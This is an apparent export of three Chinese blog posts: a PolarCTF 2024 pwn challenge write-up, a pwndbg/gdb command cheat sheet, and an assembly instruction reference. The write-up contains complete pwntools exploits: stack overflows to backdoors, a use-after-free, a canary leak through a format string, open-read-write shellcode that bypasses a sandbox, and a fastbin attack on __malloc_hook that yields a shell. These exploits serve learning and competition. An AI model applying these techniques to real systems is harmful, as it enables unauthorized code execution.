[{"content":"find 题目分析： start函数存在栈溢出\n题目给出了后门函数，该函数的str全局变量的内容为/bin/sh\n直接采用ret2text即可\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2148) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) backdoor = 0x080485F1 #debug() io.sendlineafter(\u0026#34;Please enter what you need:\\n\u0026#34;,\u0026#34;2\u0026#34;) payload = flat([cyclic(0x70+4),backdoor]) io.sendafter(\u0026#34;Give You Ret2libc\\n\u0026#34;,payload) io.interactive() sys 题目分析： 打开ida，发现存在很多函数，初步判断是静态链接的题目，其中start函数存在栈溢出\n同时题目给出后门函数\n正常打ret2text即可\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2111) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) backdoor = 0x080488D2 #debug() payload = flat([cyclic(0x28+4),backdoor]) io.send(payload) io.interactive() ezUAF 题目分析： ida打开题目，可以发现是堆题。漏洞点在del_note\n通过观察add_note函数，新增的A堆块会通过另一个B堆块存储A堆块地址。其中B[0]存储print_note_content函数地址，b[1]存储A堆块地址。\n通过阅读print_note函数发现，输出堆块内容的方式是通过调用B[0]存储的函数地址，输出B[1]地址指向的内容\n同时本题提供了后门函数的利用\n因此本题可以利用堆风水布局，申请B堆块空间，将B[0]更改为后门函数地址，同时利用UAF漏洞，调用后门函数。\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; io = process(filename) #io = remote(\u0026#34;120.46.59.242\u0026#34;,2081) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) def add(size,content): io.sendafter(\u0026#34;Your choice :\u0026#34;,\u0026#34;1\u0026#34;) io.sendafter(\u0026#34;Note size :\u0026#34;,str(size)) io.sendafter(\u0026#34;Content\u0026#34;,content) def delete(index): io.sendafter(\u0026#34;Your choice :\u0026#34;,\u0026#34;2\u0026#34;) io.sendafter(\u0026#34;Index :\u0026#34;,str(index)) def show(index): io.sendafter(\u0026#34;Your choice :\u0026#34;,\u0026#34;3\u0026#34;) io.sendafter(\u0026#34;Index :\u0026#34;,str(index)) backdoor = 0x08048945 #debug() add(0x20,\u0026#34;aa\u0026#34;)#0 add(0x20,\u0026#34;bb\u0026#34;)#1 add(0xb,\u0026#34;cc\u0026#34;)#2 delete(0) delete(1) add(0xb,p32(backdoor))#3 show(0) io.interactive() chunk1 题目分析： 从vuln函数可看出，存在两次格式化字符串漏洞，并且两次读取都存在溢出。 题目给出了后门函数\n同时本题的canary保护开启、PIE保护关闭，因此可以利用第一次格式化字符串，泄露canary值，第二次直接通过溢出覆盖vuln函数返回地址为后门函数地址即可。\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2106) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) backdoor = 0x080485F1 #debug() # 泄露canary payload = b\u0026#39;%31$p\u0026#39; io.send(payload) sleep(0.5) canary = int(io.recv(10),16) print(\u0026#34;canary:\u0026#34; + hex(canary)) # 覆盖ret为backdoor payload = flat([cyclic(0x70-0xc),canary,cyclic(0xc),backdoor]) io.send(payload) io.interactive() try_sandbox 题目分析： 一道沙箱题，禁用了execve。\n题目使用mmap开辟了一段rwx权限的空间(0x166000)\n查看sub_40129e伪代码，存在栈溢出\n因此利用思路是利用一次栈迁移，重复调用read(0,buf,0x80)，将shellcode(orw)写入0x166000的地方，然后通过ret2text执行shellcode。\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2142) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) rwx_addr = 0x166000 read_addr = 0x4012cc #debug() payload = flat([cyclic(0x40),rwx_addr+0x40,read_addr,rwx_addr]) io.sendafter(\u0026#34;我都我都不让你执行了\\n\u0026#34;,payload) shellcode = \u0026#39;\u0026#39;\u0026#39; //调用open() mov r15, 0x67616c66 push r15 mov rdi, rsp xor rsi,rsi push 2 pop rax syscall //调用read() push 3 pop rdi mov rsi, rsp mov rdx, 0xff xor rax,rax syscall //调用write() push 1 pop rdi mov rsi, rsp mov rdx, 0xff mov rax, rdi syscall \u0026#39;\u0026#39;\u0026#39; shellcode = asm(shellcode).ljust(0x48,b\u0026#39;\\x90\u0026#39;) + p64(rwx_addr) pause() io.send(shellcode) io.interactive() unk 题目分析： 打开后发现是堆题，题目同时存在UAF和堆溢出，没有额外限制（所以就不贴图了），同时远程libc版本为2.232.23-0ubuntu11.3_amd64，本题解题方法较多:\n我这边采用UAF漏洞，通过unsortedbin chunk 泄露libc地址，然后通过fastbin attack改写__malloc_hook为one_gadget\nexp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2108) elf = ELF(filename) libc = elf.libc # 2.23-0ubuntu11.3_amd64 def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) #gdb.attach(io) gdb.attach(io,\u0026#34;b *0x4009fe\u0026#34;) def add(index,size): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;1\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) io.sendafter(\u0026#34;size:\\n\u0026#34;,str(size)) def delete(index): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;2\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) def edit(index,length,content): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;3\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) io.sendafter(\u0026#34;length:\\n\u0026#34;,str(length)) io.sendafter(\u0026#34;content:\\n\u0026#34;,content) def show(index): io.sendafter(\u0026#34;choice:\\n\u0026#34;,\u0026#34;4\u0026#34;) io.sendafter(\u0026#34;index:\\n\u0026#34;,str(index)) add(0,0x80) add(1,0x68) delete(0) show(0) libc_base = u64(io.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x3C4B78 print(\u0026#34;libc_base:\u0026#34; + hex(libc_base)) malloc_hook = libc_base + libc.sym[\u0026#39;__malloc_hook\u0026#39;] print(\u0026#34;malloc_hook:\u0026#34; + hex(malloc_hook)) # ------------------------------------------- add(2,0x68) delete(1) edit(1,0x60,p64(malloc_hook-0x23)) # ----------------------------------- add(3,0x68) add(4,0x68) #debug() edit(4,0x60,b\u0026#39;\\x00\u0026#39;*0x13 + p64(libc_base+0xf1247)) add(5,0x20) io.interactive() \u0026#39;\u0026#39;\u0026#39; 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv \u0026#39;\u0026#39;\u0026#39; ","date":"2024-09-21T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/test-chinese/","title":"2024PolarCTF秋季个人挑战赛-pwn-wp"},{"content":"1、加载程序到gdb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 将可执行文件a.out加载到gdb调试工具中 $ gdb a.out GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1 Copyright (C) 2018 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;http://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... pwndbg: loaded 191 commands. Type pwndbg [filter] for a list. pwndbg: created $rebase, $ida gdb functions (can be used with print/break) Reading symbols from a.out...(no debugging symbols found)...done. pwndbg\u0026gt; 输入Tab键可以查看所有命令 Display all 200 possibilities? (y or n) 输入y显示所有命令 ! breakrva down-silently + brva dprintf - bt dps \u0026lt; bugreport dq ... ... 2、运行程序 1 2 3 4 5 6 7 （常用） pwndbg\u0026gt; start 或 pwndgb\u0026gt; run # start的作用是将程序运行至入口点（此处入口点是gdb工具认为的入口点，不一定是main函数） # run是直接将程序完全执行一遍 3、查看寄存器信息 1 2 3 4 pwndbg\u0026gt; i r i: 查看的意思 r: 寄存器的意思 # 此命令在pwndbg插件中很少用，因为默认情况已显示寄存器的信息 4、显示指定范围的汇编指令 1 2 3 4 5 6 disassemble可简写成disass # 1.显示main函数的汇编代码段 pwndbg\u0026gt; disassemble main # 2.显示rip寄存器指向的汇编代码段 pwndbg\u0026gt; disassemble $rip #要使用$符号指定寄存器 5、设置显示的汇编指令格式为intel 1 2 3 4 pwndbg\u0026gt; set disassembly-flavor intel #此命令很少使用，因为在pwndbg工具中默认显示的指令格式为intel #若要更改为amd指令，可设置为set disassembly-flavor att #如果没有pwndbg插件的话，可以编辑~/.gdbinit文件，添加该命令 6、指令执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 1.执行单条汇编指令 pwndbg\u0026gt; ni # 2.步入汇编指令 pwndbg\u0026gt; si # ni和si的区别在于，ni不会进入函数内部，si会进入函数内部 # n s 和 ni si 的区别是，n s 针对的是源代码，ni si针对的是汇编指令 # n是next的意思 # --------------------------------------------------- # 3.跳出函数 pwndbg\u0026gt; finish 当使用si进入某函数调试，需要跳出当前函数时，使用finish命令可以跳出 7、断点设置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # 1.在0x000abc地址处设置断点 pwndbg\u0026gt; b * 0x000abc # 通过偏移进行断点设置(如偏移值为0x00001124) pwndbg\u0026gt; b *$rebase(0x00001124) # 2.查看断点 pwndbg\u0026gt; i b # 3.将程序运行至断点处 pwndbg\u0026gt; c # 4.设置某断点失效 pwndbg\u0026gt; disable b id id指的是断点的编号 # 5.恢复某失效的断点 pwndbg\u0026gt; enable b id # 6.删除断点 pwndbg\u0026gt; d id 8、打印操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 # 1.打印rip寄存器的值 pwndbg\u0026gt; print $rip # 2.打印rip-0x10的地址值 pwndbg\u0026gt; print $rip-0x10 print命令一般很少用 # 3.打印结构体 pwndbg\u0026gt; ptype stdout 使用x命令打印内容（非常重要，经常使用） # 1.打印rip寄存器指向的地址后20条指令 pwndbg\u0026gt; x/20i $rip x:打印 20:打印的记录数 i:以指令的形式显示 其中i可以替换为下面的形式： x：按16进制格式显示变量 d：按10进制格式显示变量 u：按10进制格式显示无符号整型 o：按8进制格式显示变量 t：按2进制格式显示变量 a：按16进制格式显示变量 c：按字符格式显示变量 f：按浮点格式显示变量 # 2.打印rip寄存器指向的地址后20条数据(包括rip的数据) pwndbg\u0026gt; x/20b $rip b：表示1字节 h：表示2字节 w：表示4字节 g：表示8字节 # 3.可以复合使用，如：打印rip寄存器后20条的数据(包括rip的数据)，以1字节的方式输出(十六进制显示) pwndbg\u0026gt; x/20bx $rip # telescope：将指定内存空间按照stack命令的格式进行显示 pwndbg\u0026gt; telescope 0x555555558000 20 00:0000│ 0x555555558000 (data_start) ◂— 0x0 01:0008│ 0x555555558008 (__dso_handle) ◂— 0x555555558008 02:0010│ 0x555555558010 ◂— 0x0 03:0018│ 0x555555558018 ◂— 0x0 04:0020│ 0x555555558020 (stdout@GLIBC_2.2.5) —▸ 0x7ffff7e1b780 (_IO_2_1_stdout_) ◂— 0xfbad2084 ... ... 9、设置内存值 1 2 3 4 5 6 7 8 9 10 # 1.设置0x00abc的内存值为0x61 pwndbg\u0026gt; set *0x00abc=0x61 # 2.通过寄存器的方式设置内存值 pwndbg\u0026gt; set * ((unsigned long)$rbp) = 0x61 注：若程序是64位，则强制转换的类型为long，若程序是32位，则强制转换的类型是int # 3.设置$rax+0x10的内存值为0xabcdef pwndbg\u0026gt; set *((unsigned long)$rax+0x10)=0xabcdef 注：若程序是64位，则强制转换的类型为long，若程序是32位，则强制转换的类型是int 10、打印函数地址 1 2 打印函数名为func的地址(有符号表就可以打印出来) pwndbg\u0026gt; print \u0026amp;func 11、打印栈地址 1 2 3 4 5 6 # 1.打印栈信息 pwndbg\u0026gt; stack # 2.打印栈地址附近的30条信息 pwndbg\u0026gt; stack 30 注意：打印的第一条记录是rsp/esp指向的位置信息 12、cyclic构建字符 1 2 3 4 5 6 7 # 1.创建30个字符 pwndbg\u0026gt; cyclic 30 aaaabaaacaaadaaaeaaafaaagaaaha # 2.计算生成的字符所在位置 pwndbg\u0026gt; cyclic -l iaaa 32 13、打印字符串的地址 1 2 # 1.打印字符串\u0026#34;/bin/sh\u0026#34;所在的地址 pwndbg\u0026gt; search \u0026#34;/bin/sh\u0026#34; 14.查看内存 1 pwndbg\u0026gt; vmmap 15.查看plt、got、elf 1 2 3 4 5 6 # 1、查看plt表 pwndbg\u0026gt; plt # 2、查看got表 pwndbg\u0026gt; got # 3、查看elf表 pwndbg\u0026gt; elf 16.子进程调试设置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 1.设置调试父进程/子进程 set follow-fork-mode [parent|child] # 2.查询当前fork模式 show follow-fork-mode # 3.设置其它线程不执行，只有调试线程执行 set scheduler-locking [on|off|step] # 4.显示线程 info thread # 5.切换线程 thread id # 6.GDB为特定线程设置断点 break location thread id 17.寻找TLS结构体地址 1 2 # 查找TLS结构体地址的gdb命令 fsbase 18、堆的相关操作 1 2 3 4 5 6 7 8 9 10 11 # 查看堆块内容情况 \u0026gt; vis # 查看bins结构 \u0026gt; bins # 查看分配的堆块 \u0026gt; heap # 查看堆块状态 \u0026gt; par w、pwndbg显示设置 若需要将pwndbg的显示放在第二个终端，则在~/.gdbinit文件处添加以下内容\n1 set context-output /dev/pts/1 x、退出gdb调试 1 2 pwndbg\u0026gt; quit 或者可以直接简写：q 后续有待补充\u0026hellip; \u0026hellip;\n","date":"2024-09-21T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/gdb%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8pwndbg%E6%8F%92%E4%BB%B6/","title":"gdb动态调试工具使用（使用pwndbg插件）"},{"content":"1.Intel指令 指令 描述 例子 解释 mov 传送数据 mov rax,18 将18的值传送进rax寄存器(rax = 18) add 加法运算 add rax,rbx rax与rbx的值相加，并存储在rax(rax = rax + rbx) sub 减法运算 sub rax,9 rax减9，将结果存储在rax(rax = rax - 9) xor 异或运算 xor rax,rax 将rax与rax进行异或处理,等价于：(rax = 0) call 调用函数 lea 取地址，现在一般用于运算 lea rax,[rbp - 18] 将rbp-18的结果传送到rax(rax = rbp - 18) cmp 判断指令，实际作用是做减法运算，通常搭配J开头的命令进行使用 cmp rax,0x61 进行rax - 0x61运算，此命令不会将运算的结果值存储(rax - 0x61) movzx 传送数据 movzx rax,BYTE ptr [rbp-0x10] 相当于将rbp-0x10地址的值，取8位数字传送至rax处BYTE:8位WORD:16位DWORD:32位QWORD:64位 push 压栈 push ebp 等同于：mov esp,esp - 4mov [esp],ebp[]的作用是取寄存器里的地址指向的值没有[]的作用是取寄存器的地址 pop 弹栈 pop ebp 等同于mov ebp,[esp]mov esp,esp+4 leave 返回上级函数时，恢复原本栈空间 leave mov esp,ebppop ebp ret 返回上级函数后，执行上级函数的指令 ret 等同于pop eip（这条指令实际是不存在的，不能直接向RIP寄存器传送数据） call 调用指定函数，注意，调用函数时，push eip的值实际上eip下一条指令的地址值 call dofunc 等同于push eipjmp dofunc nop 无操作，仅使ip指令+1，对应的指令是：\\x90 test 测试指定寄存器中的值与另一个值（常数或寄存器）的按位与操作结果，而不改变寄存器的值。如果结果为零，将设置零标志位ZF。 test rax,rax 指令 描述 标记位 JE,JZ 结果为0则跳转（相等时跳转） ZF=1 JNE,JNZ 结果不为0则跳转（不相等时则跳转） ZF=0 JS 结果为负跳转 SF=1 JNS 结果为非负跳转 SF=0 JP,JPE 结果中1的个数为偶数则跳转 PF=1 JNP,JPO 结果中1的个数为奇数则跳转 PF=0 JO 结果溢出了则跳转 OF=1 JNO 结果没有溢出则跳转 OF=0 JB,JNAE 小于则跳转（无符号数） CF=1 JNB,JAE 大于等于则跳转（无符号数） CF=0 JBE,JNA 小于等于则跳转（无符号数） CF=1 or ZF=1 JNBE,JA 大于则跳转（无符号数） CF=0 and ZF=0 JL,JNGE 小于则跳转（有符号数） SF≠OF JNL,JGE 大于等于则跳转（有符号数） SF=OF JLE,JNG 小于等于则跳转（有符号数） ZF=1 or SF≠OF JNLE,JG 大于则跳转（有符号数） ZF=0 and SF=OF 2.mips指令 寄存器的作用\n1 2 3 4 5 6 7 8 9 10 11 $0：$zero 常量0(constant value 0) $1：$at 保留给汇编器(Reserved for assembler) $2-$3：$v0-$v1 函数调用返回值(values for results and expression evaluation) $4-$7：$a0-$a3 函数调用参数(arguments) $8-$15：$t0-$t7 暂时的(或随便用的) $16-$23：$s0-$s7 保存的(或如果用，需要SAVE/RESTORE的)(saved) $24-$25：$t8-$t9 暂时的(或随便用的) $28：$gp 全局指针(Global Pointer) $29：$sp 堆栈指针(Stack Pointer) $30：$fp/$s8 栈帧指针(Frame Pointer) $31：$ra 返回地址(return address) 指令 描述 例子 解释 j 跳转至标签处，相当于jmp指令 jr 跳转至寄存器里的地址指向的值，通常函数的返回处使用的指令为jr指令 jr $ra 将pc指令指向$ra寄存器里的值 jal 跳转指令，返回地址存储在$ra寄存器中，一般用于函数调用 jmp 目标地址mov fp,sp jalr 与jal指令类似，只不过jal的对象为寄存器 la 相当于x86的lea sw sw $ra, 0x5c($sp) 把$ra的内容写入到[$sp+0x5c]中 ","date":"2024-09-21T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/","title":"汇编指令学习"}]